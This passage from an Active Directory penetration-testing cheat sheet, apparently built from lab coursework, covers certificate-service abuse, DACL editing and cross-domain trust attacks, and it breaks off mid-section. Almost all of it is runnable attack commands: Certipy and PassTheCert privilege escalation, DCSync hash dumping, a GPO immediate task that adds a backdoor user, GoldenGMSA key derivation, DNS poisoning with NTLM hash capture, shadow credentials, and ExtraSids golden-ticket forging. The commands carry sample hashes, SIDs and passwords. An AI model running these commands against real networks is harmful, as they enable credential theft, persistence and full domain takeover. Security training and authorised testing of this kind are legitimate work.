[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@[domain]':
aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
Note: The resulting NT hash can be used directly in Pass-the-Hash attacks or cracked offline. The administrator.ccache credential cache file enables Kerberos-based access without the password.

Methodology

  • Request a Certificate Request Agent certificate: 
    certipy req -u cert_admin -p '[password]' -dc-ip <DC_IP> \
  -target <DC_FQDN> -ca <CA_NAME> \
  -template WebServer -upn administrator@<DOMAIN> \
  -application-policies 'Certificate Request Agent'
  • Use agent cert to obtain an Administrator certificate: 
    certipy req -u cert_admin -p '[password]' -dc-ip <DC_IP> \
  -target <DC_FQDN> -ca <CA_NAME> \
  -template User -pfx cert_admin.pfx \
  -on-behalf-of '<DOMAIN>\Administrator'
  • Authenticate with the certificate to retrieve NT hash: 
    certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

10.4 DACL Exploitation via ADCS

A Discretionary Access Control List (DACL) defines which principals can access or modify AD objects. When an attacker holds GenericAll or WriteDACL over an OU or group, they can grant themselves FullControl and then perform further privilege escalation.

10.4.1 Taking Ownership with BloodyAD

# Install BloodyAD
pipx install bloodyAD

# Set a user as the owner of a group
bloodyAD --host dc.example.local -d example.local \
  -u <username> -p <password> set owner <group-name> <username>

10.4.2 Step 1: Obtain a TGT for Kerberos Operations

# Sync clock with DC
sudo ntpdate <target-ip>
# or
sudo rdate -n <target-ip>

# Get a TGT using Impacket
impacket-getTGT -dc-ip <target-ip> example.local/username:password

# Set credential cache environment variable
export KRB5CCNAME=username.ccache

10.4.3 Step 2: Read and Write DACLs with dacledit

# Install dacledit (part of Impacket)
git clone https://github.com/fortra/impacket.git
cd impacket
python3 -m venv .venv
source .venv/bin/activate
pip3 install impacket
pip3 install -r requirements.txt
python3 examples/dacledit.py --help

# Read the DACL on a group
python3 examples/dacledit.py -action read \
  -target TestGroup -principal username \
  -dc-ip 10.0.0.1 example.local/username:password

# Use Kerberos + LDAPS flags
-use-ldaps -k

# Write FullControl rights to an OU
python3 examples/dacledit.py -action write \
  -rights 'FullControl' -principal username \
  -target-dn 'OU=SERVICE USERS,DC=EXAMPLE,DC=LOCAL' \
  -inheritance -dc-ip dc.example.local \
  example.local/username:password -use-ldaps -k

10.4.4 Post-Exploitation after DACL Write

Method 1: Add user to a privileged group and extract NT hash via Shadow Credentials.

# Add user to a specific group
bloodyAD --host <target-ip> -u <username> -p <password> \
  add groupMember 'CN=Example Group,CN=Users,DC=EXAMPLE,DC=LOCAL' <username>

# Add with Kerberos auth
bloodyAD --host <target-ip> -u <username> -k add groupMember ...

# Add Shadow Credential to target using pywhisker
python3 pywhisker.py -d example.local -u <username> -p <password> \
  --target <target-username> --action add

# Get a TGT using the PFX certificate
python3 gettgtpkinit.py example.local/<target-username> \
  -cert-pfx <pfx-filepath> -pfx-pass <pfx-password> ./example.ccache

export KRB5CCNAME=./example.ccache

# Extract the NT hash
python3 getnthash.py example.local/<target-username> -key <key>

# Login using Evil-WinRM with the hash
evil-winrm -i <target-ip> -u <target-username> -H <nt-hash>

Method 2: Reset another user's password directly.

# Change target user's password
bloodyAD --host <target-ip> -u <username> -p <password> \
  set password '<target-username>' '<new-password>'

# With Kerberos auth
bloodyAD --host <target-ip> -u <username> -k set password ...

Methodology

  • Sync clock and get TGT: 
    sudo ntpdate <DC_IP>
impacket-getTGT -dc-ip <DC_IP> <domain>/<user>:<pass>
export KRB5CCNAME=<user>.ccache
  • Read DACL on target object: 
    python3 examples/dacledit.py -action read -target <TARGET> \
  -principal <username> -dc-ip <DC_IP> <domain>/<user>:<pass>
  • Write FullControl rights to target OU/object: 
    python3 examples/dacledit.py -action write -rights 'FullControl' \
  -principal <username> -target-dn '<DN>' -inheritance \
  -dc-ip <DC> <domain>/<user>:<pass> -use-ldaps -k
  • Add Shadow Credential and extract NT hash: 
    python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target> --action add
python3 gettgtpkinit.py <domain>/<target> -cert-pfx <pfx> -pfx-pass <pass> ./out.ccache
export KRB5CCNAME=./out.ccache
python3 getnthash.py <domain>/<target> -key <key>

10.5 PassTheCert - LDAPS Certificate Authentication

When PKINIT fails (e.g., the Domain Controller certificate lacks the Smart Card Logon EKU), the certificate is still usable for LDAPS authentication via Schannel. PassTheCert exploits this by authenticating to LDAPS using a certificate's private key to perform four privileged operations.

Attack Action Requires
Grant DCSync rights Modify user's nTSecurityDescriptor to add replication rights Certificate for privileged account (e.g., Exchange with WriteDacl)
RBCD Modify msDS-AllowedToActOnBehalfOfOtherIdentity on DC Admin certificate; ability to create computer objects
Add Computer Create a new machine account for RBCD Authenticated users permission to add computers
Password Reset Force-change target account password User-Force-Change-Password right on target

10.5.1 Setup: Clone and Extract Keys from PFX

# Clone PassTheCert
git clone -q https://github.com/AlmondOffSec/PassTheCert

# Extract private key from .pfx (leave Import Password blank, set PEM passphrase e.g. 1234)
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key

# Extract public key (.crt) from .pfx
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt

# Remove passphrase from private key (optional, for convenience)
openssl rsa -in administrator.key -out administrator-nopass.key

10.5.2 PassTheCert: Grant DCSync Rights (Linux)

# Grant DCSync rights to a controlled user ([user])
python3 passthecert.py -dc-ip [target-ip] \
  -crt administrator.crt -key administrator-nopass.key \
  -domain [domain] -port 636 \
  -action modify_user -target [user] -elevate

# Perform DCSync with the newly elevated account
secretsdump.py '[domain]/[user]':'[password]'@[target-ip]

10.5.3 PassTheCert: RBCD Attack (Linux)

# Create a new computer account (HTB02$)
python3 passthecert.py -dc-ip [target-ip] \
  -crt administrator.crt -key administrator-nopass.key \
  -domain [domain] -port 636 \
  -action add_computer -computer-name 'HTB02$' -computer-pass AnotherComputer002

# Grant HTB02$ delegation rights over the DC (AUTHORITY$)
python3 passthecert.py -dc-ip [target-ip] \
  -crt administrator.crt -key administrator-nopass.key \
  -domain [domain] -port 636 \
  -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'HTB02$'

# Sync clock if needed
sudo ntpdate [target-ip]

# Request a TGT impersonating Administrator via S4U2Proxy
getST.py -spn 'cifs/authority.[domain]' \
  -impersonate Administrator \
  '[domain]/HTB02$:AnotherComputer002'

# Use the TGT to get shell
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass authority.[domain]

10.5.4 PassTheCert: Password Reset (Linux)

# Reset Administrator's password
python3 passthecert.py -dc-ip [target-ip] \
  -crt administrator.crt -key administrator-nopass.key \
  -domain [domain] -port 636 \
  -action modify_user -target administrator -new-pass HackingViaLDAPS001

# Login with new credentials
wmiexec.py administrator:[email protected]

10.5.5 PassTheCert: Windows Version

The Windows version of PassTheCert uses distinguishedname and SID attributes rather than username strings. Use PowerView to gather these first.

# RDP to target
xfreerdp /u:[user] /p:'[password]' /d:[domain] /v:[target-ip] /dynamic-resolution

# Get [user] SID and distinguishedname
Get-DomainUser -Identity [user]

# Grant DCSync rights to [user] via PassTheCert.exe
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx `
  --elevate --target DC=AUTHORITY,DC=HTB `
  --sid S-1-5-21-622327497-3269355298-2248959698-12101
# RBCD from Windows: Create computer
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx `
  --add-computer --computer-name HTB05

# Get the computer SID
Get-DomainComputer -Name HTB05 -Properties objectsid

# Get DC distinguishedname
Get-DomainComputer -Name AUTHORITY -Properties distinguishedname

# Set RBCD delegation rights
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx `
  --rbcd --target "CN=AUTHORITY,OU=Domain Controllers,DC=authority,DC=htb" `
  --sid S-1-5-21-622327497-3269355298-2248959698-12603

# Execute S4U2Proxy via Rubeus
.\Rubeus.exe asktgt /user:"HTB05$" /password:"GQnwUyHRd0dLdiG1L3LupCJjNSm3JATR" `
  /domain:[domain] /impersonate:Administrator `
  /msdsspn:CIFS/AUTHORITY.AUTHORITY.HTB /ptt
# Password reset from Windows
# Get Administrator's distinguishedname
Get-DomainUser -Identity Administrator -Properties distinguishedname

# Reset password
.\PassTheCert.exe --server authority --cert-path .\administrator.pfx `
  --reset-password `
  --target CN=Administrator,CN=Users,DC=authority,DC=htb `
  --new-password PassTheCertFromWindows001
Note: PassTheCert generates a restore file when modifying nTSecurityDescriptor. Use --restore <filename> to revert changes. Cleanup actions include del_computer, remove_rbcd, and flush_rbcd.

Methodology

  • Extract keys from the PFX certificate: 
    openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt
openssl rsa -in administrator.key -out administrator-nopass.key
  • Grant DCSync rights and dump hashes: 
    python3 passthecert.py -dc-ip <DC_IP> -crt administrator.crt \
  -key administrator-nopass.key -domain <domain> -port 636 \
  -action modify_user -target <controlled_user> -elevate
secretsdump.py '<domain>/<user>':'<pass>'@<DC_IP>
  • RBCD attack - create computer, set delegation, impersonate: 
    python3 passthecert.py -dc-ip <DC_IP> -crt administrator.crt \
  -key administrator-nopass.key -domain <domain> -port 636 \
  -action add_computer -computer-name 'FAKE01$' -computer-pass 'C0mp@ss001'
python3 passthecert.py -dc-ip <DC_IP> -crt administrator.crt \
  -key administrator-nopass.key -domain <domain> -port 636 \
  -action write_rbcd -delegate-to '<DC_NAME>$' -delegate-from 'FAKE01$'
sudo ntpdate <DC_IP>
getST.py -spn 'cifs/<DC_FQDN>' -impersonate Administrator \
  '<domain>/FAKE01$:C0mp@ss001'
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass <DC_FQDN>
  • Reset admin password via LDAPS: 
    python3 passthecert.py -dc-ip <DC_IP> -crt administrator.crt \
  -key administrator-nopass.key -domain <domain> -port 636 \
  -action modify_user -target administrator -new-pass <NewPass>

10.6 Certipy and BloodHound Integration

Certipy (by Oliver Lyak) is the primary tool for enumerating and exploiting ADCS misconfigurations. It outputs results in text, JSON, and BloodHound-compatible formats. Combined with a forked BloodHound version, it creates visual attack paths through ADCS vulnerabilities.

10.6.1 Certipy Enumeration

# Full enumeration - outputs text, JSON, and BloodHound zip
certipy find -u '[email protected]' -p '[password]' -dc-ip [target-ip]

# Output BloodHound data only
certipy find -u '[email protected]' -p '[password]' -dc-ip [target-ip] -bloodhound

# Unzip the BloodHound output to inspect (not required for import)
unzip 20231128193735_Certipy.zip
# Produces: 20231128193735_cas.json and 20231128193735_templates.json

10.6.2 Collect BloodHound AD Data

# Collect standard AD data using bloodhound-python
bloodhound-python -u '[user]' -d 'lab.local' -p '[password]' \
  --zip -ns [target-ip] --dns-tcp

10.6.3 Install BloodHound Forked Version (ADCS Support)

The SpecterOps community edition does not support ADCS attack paths. Use @ly4k's forked BloodHound v4.2.0 to visualize ESC paths.

# Download forked BloodHound for Linux
wget -q https://github.com/ly4k/BloodHound/releases/download/v4.2.0-ly4k/BloodHound-linux-x64.zip

# Unzip
unzip BloodHound-linux-x64.zip

# Start neo4j
sudo /usr/bin/neo4j console

# Launch BloodHound
cd BloodHound-linux-x64/
./BloodHound --no-sandbox

After launching, drag and drop both zip files into the BloodHound GUI:

  • 20231129071447_bloodhound.zip (from bloodhound-python)
  • 20231128193735_Certipy.zip (from certipy find)

Mark compromised users as Owned (right-click node in BloodHound), then use the Analysis tab's PKI section to run queries such as Shortest Paths to Misconfigured Certificate Template from Owned Principals (ESC1).

Note: When running certipy find by default, BloodHound data is saved as a .zip alongside text and JSON output. You do not need to extract it before importing into BloodHound - drop the zip directly.

Methodology

  • Run Certipy to enumerate ADCS and generate BloodHound data: 
    certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> -bloodhound
  • Collect AD data with bloodhound-python: 
    bloodhound-python -u '<user>' -d '<domain>' -p '<pass>' \
  --zip -ns <DC_IP> --dns-tcp
  • Start BloodHound forked version, import both zip files, mark owned users, and run ESC queries: 
    sudo /usr/bin/neo4j console
cd BloodHound-linux-x64/ && ./BloodHound --no-sandbox

10.7 AD CS Basics - certutil and PowerShell Certificate Management

Before exploitation, these reconnaissance commands confirm the CA configuration and available templates from within the domain.

# Dump all CA info
certutil -dump

# List CAs
certutil -ca

# List templates available to the CA
certutil -catemplates

# View all templates in detail
certutil -template

# Inspect a named template
certutil -template ExampleTemplate

# Check what certs exist on the machine
Get-ChildItem cert:\
Get-ChildItem cert:\CurrentUser\My
Get-ChildItem cert:\LocalMachine\My
Note: After running certutil -template, look for templates where Allow Full Control or Allow Write includes groups the current account belongs to. Those templates may be modifiable for privilege escalation.

11. Active Directory Trust Attacks

Active Directory trusts extend authentication across domain and forest boundaries. Every trust is a potential lateral-movement path: compromising a child domain, an external partner forest, or a misconfigured service account can cascade into full forest takeover.

11.1 Trust Fundamentals

A trust is a relationship that allows security principals from one domain to authenticate against resources in another. Direction, transitivity, and type determine what an attacker can reach.

Trust Type Direction Transitivity Scope
Parent-Child Two-way Transitive Automatically created between parent and child domains in the same forest
Tree-Root Two-way Transitive Between the forest root and a new domain tree root within the same forest
External One-way or two-way Non-transitive Between domains in different forests; SID filtering enforced by default
Forest One-way or two-way Transitive within each forest Between two forest root domains; root of cross-forest attacks
Cross-Link / Shortcut One-way or two-way Transitive Speeds authentication between child domains in the same or different forests
Realm One-way or two-way Transitive or non-transitive Between an AD domain and a non-Windows Kerberos realm

11.1.1 Core Trust Concepts

Concept Meaning Attack Relevance
Trusting domain Domain that grants access to foreign principals Target of privilege escalation
Trusted domain Domain whose users are granted access Attacker's starting position
SID Filtering Strips foreign SIDs from Kerberos PACs at trust boundary Blocks ExtraSids attack; disabled by default on intra-forest trusts
Selective Authentication Limits which accounts can authenticate across the trust Reduces lateral movement; rarely enabled
TGT Delegation Allows TGTs to cross trust boundary for unconstrained delegation Enables printer-bug cross-forest attacks when enabled
TREAT_AS_EXTERNAL Trust attribute that enables SID history injection across forest trusts Makes cross-forest ExtraSids attack viable (Case 2)

11.2 Trust Enumeration

Map all trusts before choosing an attack path. BloodHound / Adalanche provide graphical views; PowerView and the built-in AD module give raw data.

11.2.1 PowerShell Enumeration

# Built-in AD module
Import-Module activedirectory
Get-ADTrust -Filter *

# PowerView
Import-Module .\PowerView.ps1
Get-DomainTrust                   # current domain trusts
Get-DomainTrustMapping            # recursive mapping of all reachable trusts
Get-DomainTrust -Domain logistics.ad

11.2.2 Adalanche (Graph-Based)

# Collect from the child domain DC
.\Adalanche.exe collect activedirectory --domain dev.[domain] --server DC02.dev.[domain]

# Launch analysis UI
.\Adalanche.exe analyze
Note: Run SharpHound with -d for each domain separately to populate cross-domain edges in BloodHound. Combine collection runs from multiple domains for a complete trust graph.
Methodology: Trust Enumeration
  • Run Get-ADTrust -Filter * from each compromised domain
  • Run Get-DomainTrustMapping to recursively map all reachable trusts
  • Check trust direction, transitivity, and SID filtering status
  • Run Adalanche or SharpHound against each domain; visualize in BloodHound
  • Check TrustAttributes for TREAT_AS_EXTERNAL, WITHIN_FOREST, CROSS_ORG

11.3 Unconstrained Delegation & Printer Bug (Intra-Forest)

Unconstrained delegation on a domain controller caches TGTs of every authenticating user. Combined with the Printer Bug (MS-RPRN), an attacker on a child DC can force the parent DC to authenticate and steal its TGT - granting child-to-parent domain compromise without a Golden Ticket.

11.3.1 Attack: SpoolSample + Rubeus

# On the child DC (already compromised), start monitoring for incoming TGTs
.\Rubeus.exe monitor /interval:5 /nowrap

# Trigger the parent DC ([dc].[domain]) to authenticate to the child DC
# First arg = target (machine to coerce); second arg = listener (child DC with unconstrained delegation)
.\SpoolSample.exe [dc].[domain] dc02.dev.[domain]

# Rubeus will capture the base64-encoded TGT for [dc]$
# Renew and inject it
.\Rubeus.exe renew /ticket:<base64_TGT> /ptt

# Verify ticket
klist

# With [dc]$ TGT in memory, run DCSync against the parent domain
.\mimikatz.exe "lsadump::dcsync /domain:[domain] /user:[domain]\[user]" exit
Note: The Printer Bug relies on the MS-RPRN protocol (Print Spooler service). If Print Spooler is disabled on the target DC, use PetitPotam (MS-EFSRPC) as an alternative coercion method.
Methodology: Unconstrained Delegation + Printer Bug
  • Confirm unconstrained delegation on the child DC (Get-DomainComputer -Unconstrained)
  • Start Rubeus.exe monitor /interval:5 /nowrap as SYSTEM on child DC
  • Run SpoolSample.exe <parent-DC> <child-DC> to coerce authentication
  • Copy captured base64 TGT; inject with Rubeus.exe renew /ticket:<b64> /ptt
  • Run DCSync against the parent domain to extract krbtgt hash

11.4 Configuration Naming Context (NC) Abuse

The Configuration Naming Context is a forest-wide partition replicated to every DC. A compromised child DC running as SYSTEM has write access to this partition, enabling attacks against the parent domain through ADCS, GPOs, and gMSA keys.

11.4.1 Enumerate Config NC ACL

$dn = "CN=Configuration,DC=[domain],DC=[tld]"
$acl = Get-Acl -Path "AD:\$dn"
$acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write"}

11.4.2 ADCS ESC1 via Config NC

From a child DC running as SYSTEM, enroll a certificate for a parent-domain user by targeting the parent CA - no password required because SYSTEM on the child DC has Config NC write rights.

# Elevate to SYSTEM on child DC
.\PsExec.exe -s -i powershell

# Request cert impersonating the parent domain Administrator
.\Certify.exe request /ca:[domain]\INLANEFREIGHT-[dc]-CA /domain:[domain] /template:"Copy of User" /altname:[DOMAIN]\[user]

# Convert PEM to PFX (Linux)
sed -i 's/\s\s\+/\n/g' cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate to get TGT for parent Administrator
.\Rubeus.exe asktgt /domain:[domain] /user:Administrator /certificate:cert.pfx /ptt

11.4.3 GPO On Site Attack via Config NC

SYSTEM on a child DC can create a GPO in the parent domain and link it to a site (stored in the Config NC), forcing execution on parent-domain DCs.

# Create the backdoor GPO in the parent domain
New-GPO "Backdoor" -Domain [domain]

# Import PowerView that supports New-GPOImmediateTask
Import-Module .\PowerView_2.ps1

# Schedule an immediate task via the GPO (adds a backdoor local user)
New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" `
  -Command C:\Windows\System32\cmd.exe `
  -CommandArguments "/c net user backdoor B@ckdoor123 /add" `
  -Domain [domain]

# Find the site path in Config NC
Get-ADDomainController -Server [domain] | Select ServerObjectDN
# e.g. CN=[dc],CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,...

# Link the GPO to the site (must run as SYSTEM on child DC)
.\PsExec.exe -s -i powershell.exe
$sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=[domain],DC=[tld]"
New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.[domain]

# Wait for Group Policy refresh, then authenticate as the backdoor user
.\Rubeus.exe asktgt /user:backdoor /password:'B@ckdoor123' /domain:[domain] /ptt

11.4.4 GoldenGMSA Attack via Config NC

gMSA passwords are derived from KDS Root Keys stored in the Config NC. With Config NC read access (SYSTEM on any domain DC), an attacker can compute any gMSA password offline without contacting the KDS service.

# --- Online attack (SYSTEM on child DC, reads KDS key live) ---
.\PsExec.exe -s -i powershell

# Enumerate gMSAs in the parent domain
.\GoldenGMSA.exe gmsainfo --domain [domain]

# Compute the NT hash for a specific gMSA (--forest = domain the key lives in)
.\GoldenGMSA.exe compute --sid "S-1-5-21-<parent-SID>-<RID>" --forest dev.[domain] --domain [domain]

# --- Offline attack (dump KDS key material, compute separately) ---
# Dump KDS Root Key and gMSA password ID
.\GoldenGMSA.exe kdsinfo --forest dev.[domain]
.\GoldenGMSA.exe compute --sid "S-1-5-21-<SID>" --kdskey <blob> --pwdid <blob>

# Convert the base64 gMSA password to NT hash (Python)
import hashlib, base64
base64_input = "<base64_from_GoldenGMSA>"
print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())

# Authenticate as the gMSA using its NT hash
.\Rubeus.exe asktgt /user:[user]$ /rc4:<NT_HASH> /domain:[domain] /ptt
Methodology: Config NC Abuse
  • Elevate to SYSTEM on the child DC (PsExec -s -i powershell)
  • Enumerate Config NC ACL; confirm write rights to parent Configuration partition
  • Choose attack path: ADCS ESC1 / GPO site link / GoldenGMSA
  • For ADCS: request cert with Certify.exe; convert to PFX; use Rubeus asktgt
  • For GPO site: create GPO, add immediate task, link to AD site, wait for refresh
  • For GoldenGMSA: dump KDS key; compute gMSA hash; authenticate with RC4

11.5 DNS Trust Attack

SYSTEM on a child DC has full control over the parent domain's DNS zone (replicated via Config NC). An attacker can inject a wildcard DNS record or overwrite existing A records to redirect traffic and capture NTLM hashes.

11.5.1 Wildcard Injection

# Elevate to SYSTEM on child DC
.\PsExec.exe -s -i powershell

# Inject wildcard record (* ) into parent domain DNS zone (Powermad)
Import-Module .\Powermad.ps1
New-ADIDNSNode -Node * -domainController [dc].[domain] -Domain [domain] -Zone [domain] -Tombstone -Verbose

# Verify SOA record for the zone
Get-DnsServerResourceRecord -ComputerName [dc].[domain] -ZoneName [domain] -Name "@"

# Confirm wildcard resolves
Resolve-DnsName -Name NONEXISTENT.[domain] -Server [dc].INLANEFREIGHT.AD

11.5.2 DNS Record Overwrite

# Overwrite an existing A record (e.g. DEV01) to point to attacker IP
$Old = Get-DnsServerResourceRecord -ComputerName [dc].INLANEFREIGHT.AD -ZoneName [domain] -Name DEV01
$New = $Old.Clone()
$New.TimeToLive = [System.TimeSpan]::FromSeconds(1)
$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('[target-ip]')   # attacker IP
Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName [dc].INLANEFREIGHT.AD -ZoneName [domain]

11.5.3 Capture Hashes with Inveigh

# Run Inveigh on the attacker-controlled host to capture NTLM hashes
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y

# Crack captured NTLMv2 hashes
hashcat -m 5600 captured_ntlmv2.txt /usr/share/wordlists/rockyou.txt
Methodology: DNS Trust Attack
  • Elevate to SYSTEM on the child DC
  • Inject wildcard or overwrite target A record using Powermad / Set-DnsServerResourceRecord
  • Start Inveigh on attacker host to capture incoming NTLM authentications
  • Crack captured NTLMv2 hashes with hashcat (-m 5600)
  • Use cracked credentials to authenticate across the trust

11.6 Foreign Group Membership Abuse

Foreign group membership occurs when users from one domain are added to groups in a trusted domain. Intra-forest: any group scope. Cross-forest: only Domain Local groups can contain foreign principals.

11.6.1 Enumerate Foreign Users

Import-Module .\PowerView.ps1

# Find users in the current domain who are members of groups in other domains
Get-DomainForeignUser

# Inspect the foreign group
Get-DomainGroup -Identity 'Inlanefreight_admins' -Domain [domain]
Get-DomainGroup -Identity 'Inlanefreight_admins' -Domain [domain] | Select memberof

11.6.2 Abuse Foreign Membership

# Create isolated logon session for ticket use
.\Rubeus.exe createnetonly /program:powershell.exe /show

# In the new session, request TGT for the foreign-group member
.\Rubeus.exe asktgt /user:jerry /password:jerry /domain:dev.[domain] /ptt

# Verify access to the target domain resource
klist
dir \\[dc].[domain]\c$

11.6.3 Add User to Foreign Group (Account Operators)

# Create a new user in the parent domain (requires Account Operators or GenericAll)
$SecPassword = ConvertTo-SecureString 'T3st@123' -AsPlainText -Force
New-DomainUser -Domain [domain] -SamAccountName testuser -AccountPassword $SecPassword

# Add the new user to a privileged group in the parent domain
Add-ADGroupMember -Identity "DNSAdmins" -Members testuser -Server [domain]
Methodology: Foreign Group Membership
  • Run Get-DomainForeignUser to identify cross-domain group memberships
  • Identify the privileges granted by those foreign groups
  • Create a sacrificial logon session with Rubeus createnetonly
  • Request TGT for the foreign-group member; use to access target domain resources
  • If Account Operators rights exist, create new users and add to privileged groups

11.7 Foreign ACL Principals

Foreign ACL principals are users or groups from one domain holding AD rights (GenericAll, WriteProperty, WriteDacl, etc.) on objects in another domain. These cross-domain ACEs are often invisible to standard tooling and can enable shadow credential injection or password resets.

11.7.1 Enumerate Cross-Domain ACLs

Import-Module .\PowerView.ps1

# Find rights held by a specific cross-domain user (by SID)
$sid = Convert-NameToSid rita    # rita is in dev.[domain]
Get-DomainObjectAcl -ResolveGUIDs -Identity * -Domain [domain] | Where-Object {$_.SecurityIdentifier -eq $sid}

# Enumerate ALL foreign ACL principals in a domain
$Domain    = "[domain]"
$DomainSid = Get-DomainSid $Domain
Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * | Where-Object {
    ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and
    ($_.AceType              -match 'AccessAllowed') -and
    ($_.SecurityIdentifier   -match '^S-1-5-.*-[1-9]\d{3,}$') -and
    ($_.SecurityIdentifier   -notmatch $DomainSid)
}

# Resolve a SID to a username
ConvertFrom-SID S-1-5-21-<SID>

11.7.2 Abuse GenericAll - Add to Group

# Obtain TGT for the foreign-ACL user (rita in dev domain)
.\Rubeus.exe asktgt /user:rita /password:rita /domain:dev.[domain] /ptt

# Use rita's GenericAll on a group to add her as member
Add-DomainGroupMember -Identity 'Infrastructure' -Members 'DEV\rita' -Domain [domain] -Verbose

11.7.3 Abuse GenericAll on Group - Shadow Credentials (Whisker)

# Get TGT for the foreign-ACL user (sentinal)
.\Rubeus.exe asktgt /user:sentinal /password:sentinal /ptt

# Add sentinal to Enterprise Key Admins in the parent domain
Add-DomainGroupMember -Identity 'Enterprise Key Admins' -Members 'DEV\sentinal' -Domain [domain] -Verbose

# Use Whisker to add shadow credentials to the parent DC machine account
.\Whisker.exe add /target:[dc]$ /domain:[domain]

# Request TGT for [dc]$ using the shadow certificate
.\Rubeus.exe asktgt /user:[dc]$ /certificate:<pfx_base64> /domain:[domain] /dc:[dc].INLANEFREIGHT.AD /getcredentials /show

# S4U2Self to obtain a service ticket impersonating Administrator
.\Rubeus.exe s4u /dc:[dc].[domain] /ticket:<base64_TGT> /impersonateuser:[email protected] /ptt /self /service:host/[dc].[domain] /altservice:cifs/[dc].[domain]

# Verify access to the parent DC
dir \\[dc].[domain]\c$
Methodology: Foreign ACL Principals
  • Convert foreign user to SID; search target domain ACLs with Get-DomainObjectAcl
  • Run the bulk foreign-ACL enumeration script for the target domain
  • Create sacrificial session; request TGT for the foreign-ACL principal
  • Exploit GenericAll: add to group, reset password, or inject shadow credentials
  • For Enterprise Key Admins path: use Whisker → Rubeus asktgt → S4U2Self → CIFS ticket

11.8 ExtraSids Attack (SID History Injection)

The ExtraSids attack forges a Golden Ticket for a child-domain user and appends the SID of a parent-domain privileged group (e.g., Enterprise Admins, RID 519) to the PAC. Because intra-forest SID filtering is disabled by default, the parent DC accepts the spoofed SID and grants Enterprise Admin-level access.

11.8.1 Prerequisites

Data Point Collection Command
Child domain krbtgt NT hash mimikatz "lsadump::dcsync /user:DEV\krbtgt"
Child domain SID Get-DomainSID
Parent Enterprise Admins SID Get-ADGroup -Identity "Enterprise Admins" -Server "[domain]"

11.8.2 Attack - Windows (Rubeus & Mimikatz)

# 1. Dump child krbtgt hash via DCSync
.\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit
# Note: rc4_hmac = 992093609707726257e0959ce3e24771

# 2. Get child domain SID
Get-DomainSID
# S-1-5-21-2901893446-2198612369-2488268720

# 3. Get parent Enterprise Admins SID
Get-ADGroup -Identity "Enterprise Admins" -Server "[domain]"
# S-1-5-21-2879935145-656083549-3766571964-519

# 4a. Forge Golden Ticket with ExtraSids using Rubeus
.\Rubeus.exe golden /rc4:992093609707726257e0959ce3e24771 `
  /domain:dev.[domain] `
  /sid:S-1-5-21-2901893446-2198612369-2488268720 `
  /sids:S-1-5-21-2879935145-656083549-3766571964-519 `
  /user:Administrator /ptt

# 4b. Alternatively, forge with Mimikatz
mimikatz # kerberos::golden /user:Administrator /domain:dev.[domain] `
  /sid:S-1-5-21-2901893446-2198612369-2488268720 `
  /krbtgt:992093609707726257e0959ce3e24771 `
  /sids:S-1-5-21-2879935145-656083549-3766571964-519 /ptt

# 5. Verify and access parent domain DC
klist
ls \\[dc]\c$\Users\Administrator\Desktop

11.8.3 Attack - Linux (Impacket)

# 1. Dump child krbtgt hash
secretsdump.py dev.[domain]/[user]:'[password]'@[target-ip] -just-dc-user DEV/krbtgt

# 2. Get child domain SID
lookupsid.py dev.[domain]/[user]:'[password]'@[target-ip] | grep "Domain SID"

# 3. Pivot via SSH SOCKS proxy to reach parent domain DC
ssh -D 9050 [email protected]
# Edit /etc/proxychains.conf: comment out proxy_dns; add: socks4 127.0.0.1 9050

# 4. Get parent Enterprise Admins SID (grep -B12 to show SID before group name)
proxychains lookupsid.py dev.[domain]/[user]:'[password]'@[target-ip] | grep -B12 "Enterprise Admins"

# 5. Forge Golden Ticket
ticketer.py -nthash 992093609707726257e0959ce3e24771 \
  -domain dev.[domain] \
  -domain-sid S-1-5-21-2901893446-2198612369-2488268720 \
  -extra-sid S-1-5-21-2879935145-656083549-3766571964-519 \
  [user]

# 6. Use the ticket
export KRB5CCNAME=[user].ccache
proxychains psexec.py dev.[domain]/[email protected] -k -no-pass -target-ip [target-ip]

# Alternative: automated child-to-parent escalation
proxychains raiseChild.py -target-exe [target-ip] dev.[domain]/[user]
Methodology: ExtraSids Attack
  • DCSync to get child krbtgt NT hash
  • Record child domain SID and parent Enterprise Admins SID (with RID 519)
  • Forge Golden Ticket with /sids:<parent-EA-SID> appended
  • Inject ticket; verify klist; access parent DC \\[dc]\c$
  • On Linux: use ticketer.py + psexec.py via proxychains, or raiseChild.py

11.9 Cross-Forest Kerberoasting

A bidirectional forest trust allows SPN lookups across the trust boundary. Any service account in the trusted forest with a registered SPN is kerberoastable from the trusting forest.

11.9.1 Attack

# RDP into a host in the [domain] forest
proxychains xfreerdp /u:Administrator /p:'HTB_@cademy_adm!' /v:[target-ip] /dynamic-resolution

# Kerberoast all SPNs in the logistics.ad forest (bidirectional trust required)
